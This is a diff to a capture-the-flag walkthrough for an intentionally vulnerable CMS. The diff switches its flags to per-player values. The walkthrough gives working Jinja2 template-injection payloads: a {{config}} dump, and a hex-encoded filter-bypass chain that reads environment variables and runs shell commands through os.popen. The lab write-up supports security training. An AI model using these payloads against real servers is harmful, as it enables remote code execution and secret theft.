@@ -86,16 +86,16 @@ curl -H "X-Debug-Token: novacms-internal" http://localhost:5175/api/status
 
 ### Discovery Path
 
-1. From Flag 1, the `/health` response confirms the engine is `jinja2` and hints `config_note: "SECRET_KEY rotation pending -- current key may be a flag"`.
+1. From Flag 1, the `/health` response confirms the engine is `jinja2` and hints `config_note: "FLAG2_CATALOG in app config holds the per-player flag2 values"`.
 2. The editor has a "Live Preview" feature. The toggle shows **Legacy Preview (v1 — deprecated)** / **Production Preview (v2 — WAF-protected)**, pushing toward v1 for initial exploration.
 3. Editor source contains:
    ```html
    <!-- TODO: sanitise preview input before Jinja render -->
-   <!-- Note: app SECRET_KEY is the CMS master credential -- flag2 -->
+   <!-- Note: per-player flag2 values are loaded into app.config['FLAG2_CATALOG'] at boot -->
    ```
 4. CHANGELOG (`/static/CHANGELOG.md`, linked from the page footer and `/health`) has:
    ```
-   [SECURITY] Rotated SECRET_KEY. Old value was being used as internal auth token (flag2).
+   [SECURITY] flag2 values are now staged in app.config['FLAG2_CATALOG']. Any {{config}} dump leaks the full catalog.
    ```
 
 ### Exploit
@@ -105,13 +105,13 @@ curl -H "X-Debug-Token: novacms-internal" http://localhost:5175/api/status
 3. Type `{{config}}` and click Preview.
 4. The output contains the full Flask config including:
    ```
-   SECRET_KEY: novacms-dev-2024
+   'FLAG2_CATALOG': {'abcd12': 'durham-cms-flag2{...}', 'efgh34': 'durham-cms-flag2{...}', 'ijkl56': 'durham-cms-flag2{...}'}
    ```
-5. The editor source and CHANGELOG both confirm this is the flag.
+5. Pick the entry matching the logged-in username and submit it verbatim. Scoring is byte-exact, so reading another player's flag does not score.
 
 > Note: after 5 uses of v1, a deprecation notice appears in the preview output nudging toward v2.
 
-**Flag 2:** `durham-cms-flag2{novacms-dev-2024}` *(static -- the SECRET_KEY itself)*
+**Flag 2:** `durham-cms-flag2{...}` *(per-user; copy from `FLAG2_CATALOG[<your_username>]`)*
 
 ---
 
@@ -156,13 +156,13 @@ curl -H "X-Debug-Token: novacms-internal" http://localhost:5175/api/status
 {{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('\x6f\x73')|attr('environ')}}
 ```
 
-The output contains `WAF_FLAG3: durham-cms-flag3{...}`.
+The output contains one `WAF_FLAG3_<USERNAME>: durham-cms-flag3{...}` entry per seeded player. The player picks the entry matching their own logged-in username (scoring is byte-exact, so reading another player's var does not score).
 
-Note: Flag 3 is stored in `os.environ['WAF_FLAG3']` — it does **not** appear in `{{config}}` on the unfiltered v1 endpoint. Players must use the WAF bypass to reach it.
+Note: Flag 3 is stored in `os.environ['WAF_FLAG3_<USERNAME>']` — it does **not** appear in `{{config}}` on the unfiltered v1 endpoint. Players must use the WAF bypass to reach it.
 
 **Hex encoding key:** `__` -> `\x5f\x5f`, `builtins` -> `\x62uiltins`, `import` -> `\x69mport`, `os` -> `\x6f\x73`
 
-**Flag 3:** `durham-cms-flag3{...}` *(per-user, stored in `os.environ['WAF_FLAG3']`, see flags.json)*
+**Flag 3:** `durham-cms-flag3{...}` *(per-user, stored in `os.environ['WAF_FLAG3_<USERNAME>']`, see flags.json)*
 
 ---
 
@@ -176,7 +176,7 @@ Note: Flag 3 is stored in `os.environ['WAF_FLAG3']` — it does **not** appear i
    - **CHANGELOG**: `[TODO] Audit popen/system calls in template sandbox` and `Flag files relocated to /app/secret/`
    - **WAF block response**: hints at hex encoding for blocked chars
    - **"Internal: Security Audit Notes" blog post** (visible to authenticated users): *"Audit finding: Jinja2 sandbox does not restrict os.popen() or subprocess calls. Sensitive files under /app/secret/ must be protected at the OS level."*
-3. Goal: `cat /app/secret/flag.txt`
+3. Goal: `cat /app/secret/flag_<your_username>.txt` (one flag file per seeded player — `ls /app/secret/` via the same popen primitive enumerates them).
 
 ### Exploit
 
@@ -185,10 +185,10 @@ Using the `lipsum` globals path with hex encoding to bypass the WAF.
 **Verified payload** -- all blocked keywords hex-encoded (`import` -> `\x69mport`, `os` -> `\x6f\x73`, `popen` -> `p\x6fpen`, `builtins` -> `\x62uiltins`):
 
 ```
-{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('\x6f\x73')|attr('p\x6fpen')('cat /app/secret/flag.txt')|attr('read')()}}
+{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x62uiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5f\x69mport\x5f\x5f')('\x6f\x73')|attr('p\x6fpen')('cat /app/secret/flag_abcd12.txt')|attr('read')()}}
 ```
 
-This returns the contents of `/app/secret/flag.txt`.
+This returns the contents of `/app/secret/flag_abcd12.txt`. Substitute the logged-in player's own username for `abcd12` — scoring is byte-exact.
 
 **Alternative: Full MRO chain:**
 ```
